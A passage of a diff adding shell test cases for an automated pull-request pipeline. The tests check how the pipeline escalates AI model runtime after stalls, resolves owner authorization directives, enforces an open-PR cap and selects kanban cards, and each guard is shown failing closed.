+check "a stall that saved nothing at all is classified as stuck" \
+    $([ "$(jq -n '{patch_saved:false,report_saved:false}' > "$TMP_DIR/m3.json"; \
+        autopr_stall_reason "$TMP_DIR/m3.json" 0)" = stuck ] && echo 0 || echo 1)
+check "the first empty-handed stall is exploring; the second is stuck" \
+    $([ "$(jq -n '{patch_saved:false,progress_phase:"explore"}' > "$TMP_DIR/m4.json"; \
+        autopr_stall_reason "$TMP_DIR/m4.json" 1)" = exploring ] \
+      && [ "$(autopr_stall_reason "$TMP_DIR/m4.json" 2)" = stuck ] && echo 0 || echo 1)
+check "near_publish downgrades the continuation, exploring steps up once, stuck raises to xhigh" \
+    $([ "$(autopr_runtime_for_stall near_publish 1 gpt-5.6-sol pull_request medium)" = "gpt-5.6-luna medium" ] \
+      && [ "$(autopr_runtime_for_stall exploring 1 gpt-5.6-sol pull_request medium)" = "gpt-5.6-sol high" ] \
+      && [ "$(autopr_runtime_for_stall stuck 2 gpt-5.6-sol pull_request medium)" = "gpt-5.6-sol xhigh" ] \
+      && [ "$(autopr_runtime_for_stall implementing 1 gpt-5.6-sol pull_request medium)" = "gpt-5.6-sol high" ] \
+      && echo 0 || echo 1)
+# A card can stall the SAME way repeatedly. Before this, near_publish and
+# implementing ignored the attempt count entirely and reran the identical
+# model+effort forever — the third-identical-rerun defect this ladder exists
+# to prevent, reintroduced through its two most common classifications.
+check "a repeat stall in the same classification escalates instead of rerunning identically" \
+    $([ "$(autopr_runtime_for_stall near_publish 2 gpt-5.6-sol pull_request medium)" = "gpt-5.6-luna high" ] \
+      && [ "$(autopr_runtime_for_stall near_publish 3 gpt-5.6-sol pull_request medium)" = "gpt-5.6-luna xhigh" ] \
+      && [ "$(autopr_runtime_for_stall implementing 2 gpt-5.6-sol pull_request medium)" = "gpt-5.6-sol xhigh" ] \
+      && echo 0 || echo 1)
+# Artifact kinds run with REQUIRE_EMPTY_PATCH, so the report stands in for the
+# patch and the ladder keeps them on the model their registry row chose.
+check "a stalled research card is classified from its report and stays on its own model" \
+    $([ "$(jq -n '{patch_saved:false,report_saved:true,decision_saved:true}' > "$TMP_DIR/m5.json"; \
+        autopr_stall_reason "$TMP_DIR/m5.json" 1 artifact)" = near_publish ] \
+      && [ "$(autopr_runtime_for_stall stuck 2 gpt-5.6-luna artifact high)" = "gpt-5.6-luna xhigh" ] \
+      && echo 0 || echo 1)
+# An artifact kind has no tests to run and already runs on the cheap model, so
+# there is nothing for near_publish to downgrade. Handing a stalled research
+# run LESS reasoning than the pass that failed to finish is the opposite of
+# the intent.
+check "near_publish never gives an artifact kind less reasoning than it already had" \
+    $([ "$(autopr_runtime_for_stall near_publish 1 gpt-5.6-luna artifact high)" = "gpt-5.6-luna high" ] \
+      && echo 0 || echo 1)
+check "every runtime the ladder can emit is a model and effort the sandbox accepts" \
+    $(for reason in near_publish implementing stuck exploring; do
+        for attempt in 1 2 3 9; do
+          for kind in "gpt-5.6-sol pull_request medium" "gpt-5.6-luna artifact high"; do
+            # shellcheck disable=SC2086
+            pair="$(autopr_runtime_for_stall "$reason" "$attempt" $kind)"
+            autopr_runtime_model_valid "${pair%% *}" || exit 1
+            autopr_runtime_effort_valid "${pair##* }" || exit 1
+          done
+        done
+      done && echo 0 || echo 1)
+# F1 regression: the pin only works if the real card producer carries it.
+check "collect.sh projects the runtime pin onto card.json" \
+    $(grep -qF 'autopr_model: ($t.autopr_model // null)' "$AUTOPR_DIR/collect.sh" \
+      && grep -qF 'autopr_effort: ($t.autopr_effort // null)' "$AUTOPR_DIR/collect.sh" \
+      && echo 0 || echo 1)
+# F2 regression: parse as UTC, render in Pacific. 19:34Z is 12:34 PDT.
+check "autopr_to_pacific converts a UTC stamp rather than relabelling it" \
+    $([ "$(autopr_to_pacific 2026-09-12T19:34:00Z)" = "2026-09-12 12:34 PDT" ] \
+      && [ "$(autopr_to_pacific 2026-01-15T08:00:00Z)" = "2026-01-15 00:00 PST" ] \
+      && echo 0 || echo 1)
+
+# The policy step is where the three sources are reconciled, so assert there
+# rather than only on the ladder in isolation.
+jq -n --arg created_at "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
+    '{schema_version:1,created_at:$created_at,patch_saved:true}' \
+    > "$runtime_task_root/run-1/metadata.json"
+# At the TASK root: `active` can name an in-flight snapshot written before the
+# stall was classified, so the suggestion never lives in a checkpoint dir.
+jq -n '{stall_reason:"stuck",stall_attempt:2,
+        suggested_model:"gpt-5.6-sol",suggested_effort:"xhigh"}' \
+    > "$runtime_task_root/stall.json"
+AUTOPR_RUNTIME_HISTORY_FILE="$TMP_DIR/normal-runtime-history.json" \
+    AUTOPR_CHECKPOINT_ROOT="$RUNTIME_CHECKPOINTS" \
+    "$AUTOPR_DIR/runtime-policy.sh" "$TMP_DIR/runtime-card.json" \
+    "$TMP_DIR/auto-runtime-policy.json"
+check "an unpinned card inherits the runtime the last stall suggested" \
+    $(jq -e '.model == "gpt-5.6-sol" and .effort == "xhigh"
+             and .runtime_source == "auto" and .stall_reason == "stuck"
+             and .stall_attempt == 2' \
+      "$TMP_DIR/auto-runtime-policy.json" >/dev/null && echo 0 || echo 1)
+
+jq '. + {autopr_model:"gpt-5.6-luna",autopr_effort:"low"}' \
+    "$TMP_DIR/runtime-card.json" > "$TMP_DIR/pinned-runtime-card.json"
+AUTOPR_RUNTIME_HISTORY_FILE="$TMP_DIR/normal-runtime-history.json" \
+    AUTOPR_CHECKPOINT_ROOT="$RUNTIME_CHECKPOINTS" \
+    "$AUTOPR_DIR/runtime-policy.sh" "$TMP_DIR/pinned-runtime-card.json" \
+    "$TMP_DIR/pinned-runtime-policy.json"
+check "a card that pins a runtime overrides the automatic escalation" \
+    $(jq -e '.model == "gpt-5.6-luna" and .effort == "low"
+             and .runtime_source == "manual"' \
+      "$TMP_DIR/pinned-runtime-policy.json" >/dev/null && echo 0 || echo 1)
+
+jq '. + {autopr_model:"gpt-9-nonexistent",autopr_effort:"extreme"}' \
+    "$TMP_DIR/runtime-card.json" > "$TMP_DIR/bogus-runtime-card.json"
+AUTOPR_RUNTIME_HISTORY_FILE="$TMP_DIR/normal-runtime-history.json" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/empty-checkpoints" \
+    "$AUTOPR_DIR/runtime-policy.sh" "$TMP_DIR/bogus-runtime-card.json" \
+    "$TMP_DIR/bogus-runtime-policy.json"
+check "a pinned runtime no endpoint knows is dropped, not handed to the sandbox" \
+    $(jq -e '.model == null and .effort == null and .runtime_source == "default"' \
+      "$TMP_DIR/bogus-runtime-policy.json" >/dev/null && echo 0 || echo 1)
+
+cat > "$TMP_DIR/consumed-directive-card.json" <<'EOF'
+{"board_column":"todo","progress_note":"🤖 AUTO SETUP · NO PR: ALREADY FIXED · [autopr:no-spec 2026-09-02T01:00:00Z] already_fixed","autopr_reconsideration_pending":false}
+EOF
+cat > "$TMP_DIR/consumed-directive-history.json" <<'EOF'
+[
+  {"id":"consumed-event","created_at":"2026-09-02T00:59:00Z","metadata":{"kind":"autopr_additional_context","body":"just go ahead and do it anyways","autopr_reconsideration_of":"🤖 AUTO SETUP · NO PR: ALREADY FIXED · [autopr:no-spec 2026-09-02T00:30:00Z] already_fixed"}}
+]
+EOF
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --recover-consumed \
+    --card "$TMP_DIR/consumed-directive-card.json" \
+    --history "$TMP_DIR/consumed-directive-history.json" \
+    --output "$TMP_DIR/recovered-consumed-directive.json"
+check "legacy go-ahead context survives one obsolete repeated already-fixed result" \
+    $(jq -e '.directives == ["draft_pr"] and .source_event_id == "consumed-event"' \
+      "$TMP_DIR/recovered-consumed-directive.json" >/dev/null && echo 0 || echo 1)
+
+jq '.progress_note = "🤖 AUTO SETUP · NO PR: POLICY BLOCKED · [autopr:no-spec 2026-09-02T01:00:00Z] policy_blocked"' \
+    "$TMP_DIR/consumed-directive-card.json" > "$TMP_DIR/nonrecoverable-card.json"
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --recover-consumed \
+    --card "$TMP_DIR/nonrecoverable-card.json" \
+    --history "$TMP_DIR/consumed-directive-history.json" \
+    --output "$TMP_DIR/nonrecovered-directive.json"
+check "consumed directive recovery cannot override a different current blocker" \
+    $(jq -e '.directives == [] and .source_event_id == null' \
+      "$TMP_DIR/nonrecovered-directive.json" >/dev/null && echo 0 || echo 1)
+
+for phrasing in "you can work on this." "do it anyway" "draft the migration" \
+    "it can absolutely draft a pr with migration scripts"; do
+    jq --arg body "$phrasing" '.[1].metadata.body = $body' \
+        "$TMP_DIR/pending-directive-history.json" > "$TMP_DIR/natural-directive-history.json"
+    python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+        --card "$TMP_DIR/pending-directive-card.json" \
+        --history "$TMP_DIR/natural-directive-history.json" \
+        --output "$TMP_DIR/resolved-natural-directive.json"
+    check "plain owner authorization grants a draft: $phrasing" \
+        $(jq -e '.directives == ["draft_pr"]' "$TMP_DIR/resolved-natural-directive.json" \
+          >/dev/null && echo 0 || echo 1)
+done
+
+jq '.progress_note = "🤖 AUTO SETUP · NO PR: MIGRATION REQUIRED · [autopr:no-spec 2026-09-02T01:00:00Z] migration_required"
+    | .autopr_reconsideration_pending = false' \
+    "$TMP_DIR/consumed-directive-card.json" > "$TMP_DIR/consumed-migration-card.json"
+jq '.[0].metadata.autopr_reconsideration_of = "🤖 AUTO SETUP · NO PR: MIGRATION REQUIRED · [autopr:no-spec 2026-09-02T00:30:00Z] migration_required"
+    | .[0].metadata.body = "you can work on this."' \
+    "$TMP_DIR/consumed-directive-history.json" > "$TMP_DIR/consumed-migration-history.json"
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --recover-consumed \
+    --card "$TMP_DIR/consumed-migration-card.json" \
+    --history "$TMP_DIR/consumed-migration-history.json" \
+    --output "$TMP_DIR/recovered-migration-directive.json"
+check "an old migration-required card is not revived by consumed authorization" \
+    $(jq -e '.directives == [] and .source_event_id == null' \
+      "$TMP_DIR/recovered-migration-directive.json" >/dev/null && echo 0 || echo 1)
+
+# acceptance_criteria_met is permitted under draft_pr, so a card resting on it
+# is settled. Re-granting the directive there re-runs the model every cycle to
+# reach the same verdict forever.
+jq '.progress_note = "🤖 AUTO SETUP · NO PR: CARD ALREADY SATISFIED · [autopr:no-spec 2026-09-02T01:00:00Z] acceptance_criteria_met"' \
+    "$TMP_DIR/consumed-directive-card.json" > "$TMP_DIR/settled-acceptance-card.json"
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --recover-consumed \
+    --card "$TMP_DIR/settled-acceptance-card.json" \
+    --history "$TMP_DIR/consumed-directive-history.json" \
+    --output "$TMP_DIR/settled-acceptance-directive.json"
+check "a card resting on acceptance_criteria_met stops re-recovering the directive" \
+    $(jq -e '.directives == [] and .source_event_id == null' \
+      "$TMP_DIR/settled-acceptance-directive.json" >/dev/null && echo 0 || echo 1)
+
+# The prior bound decision may still have been acceptance_criteria_met: the
+# owner answered it and the next pass fell back to a forbidden refusal, so that
+# authorization is still owed.
+jq '.[0].metadata.autopr_reconsideration_of = "🤖 AUTO SETUP · NO PR: CARD ALREADY SATISFIED · [autopr:no-spec 2026-09-02T00:30:00Z] acceptance_criteria_met"' \
+    "$TMP_DIR/consumed-directive-history.json" > "$TMP_DIR/prior-acceptance-history.json"
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --recover-consumed \
+    --card "$TMP_DIR/consumed-directive-card.json" \
+    --history "$TMP_DIR/prior-acceptance-history.json" \
+    --output "$TMP_DIR/prior-acceptance-directive.json"
+check "an authorization spent on an acceptance_criteria_met pass is still recoverable" \
+    $(jq -e '.directives == ["draft_pr"] and .source_event_id == "consumed-event"' \
+      "$TMP_DIR/prior-acceptance-directive.json" >/dev/null && echo 0 || echo 1)
+
+# Recovery exists for standing product authority. A one-shot runtime approval
+# bound to a cycle that is already over must not ride along with it.
+jq '.[0].metadata.autopr_directives = "draft_pr,extend_runtime"
+    | .[0].metadata.body = "go ahead and do it\n--extend-runtime"' \
+    "$TMP_DIR/consumed-directive-history.json" > "$TMP_DIR/consumed-runtime-history.json"
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --recover-consumed \
+    --card "$TMP_DIR/consumed-directive-card.json" \
+    --history "$TMP_DIR/consumed-runtime-history.json" \
+    --output "$TMP_DIR/recovered-runtime-directive.json"
+check "recovery never resurrects a spent runtime approval" \
+    $(jq -e '.directives == ["draft_pr"]' \
+      "$TMP_DIR/recovered-runtime-directive.json" >/dev/null && echo 0 || echo 1)
+
+cat > "$TMP_DIR/standing-directive-card.json" <<'EOF'
+{"board_column":"todo","progress_note":"🤖 AUTO SETUP · BLOCKED: AWAITING ANSWERS · 🟡 C60 · [autopr:directives draft_pr,extend_runtime]","autopr_reconsideration_pending":false}
+EOF
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --card "$TMP_DIR/standing-directive-card.json" \
+    --history "$TMP_DIR/pending-directive-history.json" \
+    --output "$TMP_DIR/standing-directive.json"
+check "draft authority survives while runtime approval remains one-shot" \
+    $(jq -e '.directives == ["draft_pr"]' "$TMP_DIR/standing-directive.json" >/dev/null \
+      && echo 0 || echo 1)
+
+jq '.board_column = "review"' "$TMP_DIR/standing-directive-card.json" \
+    > "$TMP_DIR/standing-directive-review-card.json"
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --card "$TMP_DIR/standing-directive-review-card.json" \
+    --history "$TMP_DIR/pending-directive-history.json" \
+    --output "$TMP_DIR/standing-directive-review.json"
+check "a standing authorization does not follow the card off the AutoPR lanes" \
+    $(jq -e '.directives == []' "$TMP_DIR/standing-directive-review.json" >/dev/null \
+      && echo 0 || echo 1)
+
+"$AUTOPR_DIR/decision.sh" directive-ok "$TMP_DIR/migration-required-decision.json" \
+    "$TMP_DIR/forced-policy.json" >/dev/null 2>&1
+directive_ok_rejects_rc=$?
+"$AUTOPR_DIR/decision.sh" directive-ok "$TMP_DIR/publication-decision.json" \
+    "$TMP_DIR/forced-policy.json" >/dev/null 2>&1
+directive_ok_accepts_rc=$?
+check "directive-ok isolates a retryable directive violation from a fatal decision" \
+    $([ "$directive_ok_rejects_rc" != 0 ] && [ "$directive_ok_accepts_rc" = 0 ] \
+      && grep -q 'decision.sh" directive-ok' "$AUTOPR_DIR/investigate.sh" \
+      && echo 0 || echo 1)
+
+jq '.[1].metadata.body = "do not go ahead and do it"' \
+    "$TMP_DIR/pending-directive-history.json" > "$TMP_DIR/negated-directive-history.json"
+python3 "$AUTOPR_DIR/resolve-directive-policy.py" \
+    --card "$TMP_DIR/pending-directive-card.json" \
+    --history "$TMP_DIR/negated-directive-history.json" \
+    --output "$TMP_DIR/resolved-negated-directive.json"
+check "negated historical context does not grant draft authority" \
+    $(jq -e '.directives == []' "$TMP_DIR/resolved-negated-directive.json" >/dev/null \
+      && echo 0 || echo 1)
+
+env -u AUTOPR_TEST_TENANT_EMAIL -u AUTOPR_TEST_TENANT_PASSWORD \
+    python3 "$AUTOPR_DIR/collect-test-tenant-evidence.py" \
+    --policy "$TMP_DIR/forced-policy.json" \
+    --output "$TMP_DIR/test-tenant-unconfigured.json" \
+    --screenshot "$TMP_DIR/test-tenant.png"
+check "test-tenant replay fails closed without exposing or requiring credentials" \
+    $(jq -e '.status == "not_configured" and .route == "/app/jobs" and .screenshot_path == null' \
+      "$TMP_DIR/test-tenant-unconfigured.json" >/dev/null && echo 0 || echo 1)
+
+check "collector preserves task attachment metadata" \
+    $(grep -qF 'attachments: (($t.attachments // []) | map(del(.storage_url)))' "$AUTOPR_DIR/collect.sh" && echo 0 || echo 1)
+
+################################################################################
+# Changes Requested wins over Todo, and a just-attempted card cools down while
+# the next five-minute tick advances to another eligible card.
+################################################################################
+cat > "$TMP_DIR/bin/gh" <<'EOF'
+#!/usr/bin/env bash
+if [[ "$*" == *"--label autopr"* && "$*" == *"--json labels"* ]]; then
+    printf '0\n'
+elif [[ "$*" == *"--label autopr"* ]]; then
+    printf '[]\n'
+elif [[ "$*" == *"--head bot/task-77777777"* ]] && [ -n "${AUTOPR_TEST_PRIOR_TASK_PR:-}" ]; then
+    printf '[{"state":"%s","createdAt":"2026-01-01T00:00:00Z","number":77,"labels":[{"name":"autopr"}],"body":""}]\n' \
+        "$AUTOPR_TEST_PRIOR_TASK_PR"
+elif [[ "$*" == *"--head bot/task-aaaaaaaa"* ]] && [ -n "${AUTOPR_TEST_PAUSED_PR:-}" ]; then
+    printf '[{"state":"OPEN","createdAt":"2026-01-01T00:00:00Z","number":91,"labels":[{"name":"autopr"},{"name":"autopr-awaiting-input"}],"body":"<!-- matcha-feedback-comment-id: %s -->"}]\n' \
+        "${AUTOPR_TEST_PAUSED_PR_SEEN_COMMENT:-old-comment}"
+elif [[ "$*" == *"pr view"* && "$*" == *"--json comments,reviews"* ]]; then
+    printf '{"comments":[{"id":"new-comment","body":"here is the answer","author":{"login":"haley"}}],"reviews":[]}\n'
+else
+    printf '[]\n'
+fi
+EOF
+chmod +x "$TMP_DIR/bin/gh"
+
+cat > "$TMP_DIR/cards.json" <<'EOF'
+[
+  {"task_id":"11111111-0000-4000-8000-000000000001","id8":"11111111","project_id":"p","title":"Older todo","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z"},
+  {"task_id":"22222222-0000-4000-8000-000000000002","id8":"22222222","project_id":"p","title":"Review feedback","board_column":"changes_requested","created_at":"2026-02-01T00:00:00Z","last_moved_at":"2026-02-01T00:00:00Z"}
+]
+EOF
+
+select_cache="$TMP_DIR/select-cache"
+first_selected="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$select_cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/cards.json")"
+check "selector prioritizes Changes Requested over Todo" \
+    $([ "$(printf '%s' "$first_selected" | jq -r '.id8')" = "22222222" ] && echo 0 || echo 1)
+
+second_selected="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$select_cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/cards.json")"
+check "cooldown lets the next tick advance to another card" \
+    $([ "$(printf '%s' "$second_selected" | jq -r '.id8')" = "11111111" ] && echo 0 || echo 1)
+
+# The cap read fails CLOSED and prefers the run-scoped snapshot: a failed
+# `gh pr list` used to leave the count empty, `[ "" -ge 10 ]` errored, and
+# the cap silently never fired.
+mkdir -p "$TMP_DIR/cap-bin"
+cat > "$TMP_DIR/cap-bin/gh" <<'EOF'
+#!/usr/bin/env bash
+if [[ "$*" == *"--label autopr"* ]]; then exit 1; fi
+printf '[]\n'
+EOF
+chmod +x "$TMP_DIR/cap-bin/gh"
+PATH="$TMP_DIR/cap-bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/cap-cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/cards.json" >/dev/null 2>&1
+cap_fail_rc=$?
+check "an unreadable open-PR count makes the selector die rather than skip the cap" \
+    $([ "$cap_fail_rc" = 1 ] && echo 0 || echo 1)
+jq -n '[range(10) | {number: ., state: "OPEN", labels: ["autopr"]}]' > "$TMP_DIR/ten-open-prs.json"
+PATH="$TMP_DIR/cap-bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" AUTOPR_BOT_PRS_FILE="$TMP_DIR/ten-open-prs.json" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/cap-cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/cards.json" >/dev/null 2>&1
+cap_file_rc=$?
+check "the run-scoped bot PR snapshot feeds the cap without another GitHub call" \
+    $([ "$cap_file_rc" = 3 ] && echo 0 || echo 1)
+
+# A per-card GitHub read that fails is still a fail-closed skip for that card,
+# but a pass where every card skipped that way is an outage, not an empty
+# queue: reporting NOTHING_TO_DO there rendered a dead token as a green
+# "Nothing to build this run." every minute, with nothing red anywhere.
+mkdir -p "$TMP_DIR/outage-bin"
+cat > "$TMP_DIR/outage-bin/gh" <<'EOF'
+#!/usr/bin/env bash
+if [[ "$*" == *"--head bot/task-"* ]]; then exit 1; fi
+printf '[]\n'
+EOF
+chmod +x "$TMP_DIR/outage-bin/gh"
+PATH="$TMP_DIR/outage-bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/outage-cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/cards.json" \
+    > "$TMP_DIR/outage-select.json" 2> "$TMP_DIR/outage-select.err"
+outage_rc=$?
+check "a pass where GitHub could not be read for any card dies instead of reporting an empty queue" \
+    $([ "$outage_rc" = 1 ] && [ ! -s "$TMP_DIR/outage-select.json" ] \
+      && grep -q 'could not read GitHub' "$TMP_DIR/outage-select.err" \
+      && echo 0 || echo 1)
+
+check "implementation PR cap defaults to ten and workflow pins it" \
+    $(grep -qF 'MAX_OPEN_IMPLEMENTATION_PRS="${MAX_OPEN_IMPLEMENTATION_PRS:-10}"' "$AUTOPR_DIR/select.sh" \
+      && grep -qF 'MAX_OPEN_IMPLEMENTATION_PRS: 10' "$REPO_ROOT/.github/workflows/kanban-autopr.yml" \
+      && echo 0 || echo 1)
+
+check "no-spec dedup recognizes the marker inside the visible origin note" \
+    $(grep -qF '[[ "$progress_note" == *"[autopr:no-spec "* ]]' "$AUTOPR_DIR/select.sh" && echo 0 || echo 1)
+
+cat > "$TMP_DIR/no-spec-card.json" <<'EOF'
+[
+  {"task_id":"33333333-0000-4000-8000-000000000003","id8":"33333333","project_id":"p","title":"Unscopable","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"from auto setup · build 550 · prod c5d3a49 · [autopr:no-spec 2026-01-02T00:00:00Z] missing evidence"}
+]
+EOF
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/no-spec-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/no-spec-card.json" >/dev/null 2>&1
+no_spec_rc=$?
+check "visible origin note still durably suppresses an unchanged no-spec card" \
+    $([ "$no_spec_rc" = "3" ] && echo 0 || echo 1)
+
+cat > "$TMP_DIR/runtime-paused-card.json" <<'EOF'
+[
+  {"task_id":"aaaaaaaa-0000-4000-8000-000000000001","id8":"aaaaaaaa","project_id":"p","title":"Long investigation","board_column":"changes_requested","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · PAUSED: APPROVE 10 MORE MINUTES · checkpoint 123"}
+]
+EOF
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/runtime-paused-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/runtime-paused-card.json" >/dev/null 2>&1
+runtime_paused_rc=$?
+check "a runtime-limited card waits instead of retrying forever" \
+    $([ "$runtime_paused_rc" = "3" ] && echo 0 || echo 1)
+
+jq '.[0].autopr_reconsideration_pending = true
+    | .[0].autopr_reconsideration_event_id = "runtime-event"
+    | .[0].autopr_reconsideration_at = "2026-01-02T00:00:00Z"' \
+    "$TMP_DIR/runtime-paused-card.json" > "$TMP_DIR/runtime-approved-card.json"
+runtime_approved="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/runtime-approved-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/runtime-approved-card.json")"
+check "new decision-bound context reopens a runtime-limited card" \
+    $([ "$(printf '%s' "$runtime_approved" | jq -r '.id8')" = "aaaaaaaa" ] \
+      && echo 0 || echo 1)
+
+# Answering on the draft PR is a documented alternate path, so the pause must
+# not hide a card whose open awaiting-input draft just received a reply.
+runtime_pr_answer="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_PAUSED_PR=1 \
+    AUTOPR_CACHE_DIR="$TMP_DIR/runtime-pr-answer-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/runtime-paused-card.json")"
+check "a PR reply reopens a runtime-limited card that already has a draft" \
+    $([ "$(printf '%s' "$runtime_pr_answer" | jq -r '.mode')" = "rework" ] \
+      && echo 0 || echo 1)
+
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_PAUSED_PR=1 AUTOPR_TEST_PAUSED_PR_SEEN_COMMENT=new-comment \
+    AUTOPR_CACHE_DIR="$TMP_DIR/runtime-pr-stale-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/runtime-paused-card.json" >/dev/null 2>&1
+runtime_pr_stale_rc=$?
+check "an open draft with no new reply leaves a paused card waiting" \
+    $([ "$runtime_pr_stale_rc" = "3" ] && echo 0 || echo 1)
+
+cat > "$TMP_DIR/reconsideration-cards.json" <<'EOF'
+[
+  {"task_id":"77777777-0000-4000-8000-000000000007","id8":"77777777","project_id":"p","title":"Reconsider me","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · NO PR: ALREADY FIXED · [autopr:no-spec 2026-01-02T00:00:00Z] already_fixed","autopr_reconsideration_pending":true,"autopr_reconsideration_event_id":"eeeeeeee-0000-4000-8000-000000000001","autopr_reconsideration_at":"2026-01-03T00:00:00+00:00"},
+  {"task_id":"88888888-0000-4000-8000-000000000008","id8":"88888888","project_id":"p","title":"Fresh work","board_column":"todo","created_at":"2026-02-01T00:00:00Z","last_moved_at":"2026-02-01T00:00:00Z"}
+]
+EOF
+reconsideration_cache="$TMP_DIR/reconsideration-cache"
+reconsidered="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$reconsideration_cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/reconsideration-cards.json")"
+check "pending additional context reopens an unchanged no-spec decision" \
+    $([ "$(printf '%s' "$reconsidered" | jq -r '.id8')" = "77777777" ] \
+      && [ "$(printf '%s' "$reconsidered" | jq -r '.mode')" = "investigate" ] \
+      && echo 0 || echo 1)
+
+cat > "$TMP_DIR/claim-recovery-cards.json" <<'EOF'
+[
+  {"task_id":"aaaaaaaa-0000-4000-8000-00000000000a","id8":"aaaaaaaa","project_id":"p","title":"Interrupted pickup","board_column":"in_progress","created_at":"2026-09-01T00:00:00Z","last_moved_at":"2026-09-10T03:00:00Z","autopr_claimed_at":"2026-09-10T03:00:01Z"},
+  {"task_id":"bbbbbbbb-0000-4000-8000-00000000000b","id8":"bbbbbbbb","project_id":"p","title":"Routine todo","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z"}
+]
+EOF
+claim_recovery="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+  AUTOPR_CACHE_DIR="$TMP_DIR/claim-recovery-cache" \
+  "$AUTOPR_DIR/select.sh" "$TMP_DIR/claim-recovery-cards.json")"
+check "an interrupted active claim outranks routine Todo work" \
+  $([ "$(printf '%s' "$claim_recovery" | jq -r '.id8')" = "aaaaaaaa" ] \
+    && echo 0 || echo 1)
+
+cat > "$TMP_DIR/run-request-cards.json" <<'EOF'
+[
+  {"task_id":"88888888-0000-4000-8000-000000000008","id8":"88888888","project_id":"p","title":"Ordinary changes-requested work","board_column":"changes_requested","created_at":"2026-02-01T00:00:00Z","last_moved_at":"2026-02-01T00:00:00Z"},
+  {"task_id":"99999999-0000-4000-8000-000000000009","id8":"99999999","project_id":"p","title":"Run me now","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · NO PR: ALREADY FIXED · [autopr:no-spec 2026-01-02T00:00:00Z] already_fixed","autopr_run_requested_at":"2026-01-03T00:00:00+00:00"}
+]
+EOF
+run_requested="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/run-request-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/run-request-cards.json")"
+check "an explicit run request outranks routine work and its own no-spec marker" \
+    $([ "$(printf '%s' "$run_requested" | jq -r '.id8')" = "99999999" ] \
+      && [ "$(printf '%s' "$run_requested" | jq -r '.mode')" = "investigate" ] \
+      && echo 0 || echo 1)
+
+# Old migration-required decisions stay settled. New runs draft migrations,
+# but abandoned cards must not be resurrected and spend another model run.
+cat > "$TMP_DIR/retired-nospec-cards.json" <<'EOF'
+[
+  {"task_id":"aaaaaaaa-0000-4000-8000-00000000000a","id8":"aaaaaaaa","project_id":"p","title":"Stopped by a retired verdict","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · NO PR: MIGRATION REQUIRED · [autopr:no-spec 2026-09-04T06:11:02Z] migration_required · note: needs a migration"}
+]
+EOF
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/retired-nospec-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/retired-nospec-cards.json" >/dev/null 2>&1
+retired_nospec_rc=$?
